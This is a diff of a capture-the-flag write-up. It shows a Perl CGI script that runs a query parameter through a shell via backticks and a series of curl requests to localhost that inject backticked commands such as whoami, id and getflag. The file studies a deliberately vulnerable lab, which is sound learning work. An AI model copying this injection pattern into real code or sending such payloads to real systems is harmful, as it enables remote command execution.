@@ -13,11 +13,14 @@ and it seems to interact with a webpage:
 ```pl
 #!/usr/bin/perl
 # localhost:4747
+
 use CGI qw{param};
   # CGI (Common Gateway Interface)
   # param: a CGI module func fetches params from HTTP requests
   # qw: quote words
+
 print "Content-type: text/html\n\n";
+
 sub x {
   $y = $_[0];
   print `echo $y 2>&1`;
@@ -26,6 +29,7 @@ sub x {
   # print w/ backticks invokes a shell command
   # 2>&1 -- combine stdout and stderr, & means 1 is a fd not a filename
 }
+
 x(param("x"));
   # 1st `x` : calling the subroutine
   # 2nd `x` : a query param
@@ -42,6 +46,7 @@ Solution
         z: scan if a port is open (a listening daemon)
 Connection to localhost 4747 port [tcp/*] succeeded!
 
+
 # eg.
 > curl localhost:4747/?x="\`/usr/bin/whoami\`" 
 > curl localhost:4747/?x="\`/usr/bin/id\`" 
@@ -49,10 +54,12 @@ Connection to localhost 4747 port [tcp/*] succeeded!
 > curl localhost:4747/?x="\`/bin/pwd\`" 
 > curl localhost:4747/?x="\`/bin/df\`" 
 
+
 # avoid typing realpath out
-> curl localhost:4747/?x="\`$(which pwd)\`" 🟢 
-or
 > curl localhost:4747/?x="\`$(whereis pwd|awk '{print $2}')\`"
+or
+> curl localhost:4747/?x="\`$(which pwd)\`" 🟢 
+
 
 # solve
 > curl localhost:4747/?x="\`$(which getflag)\`"
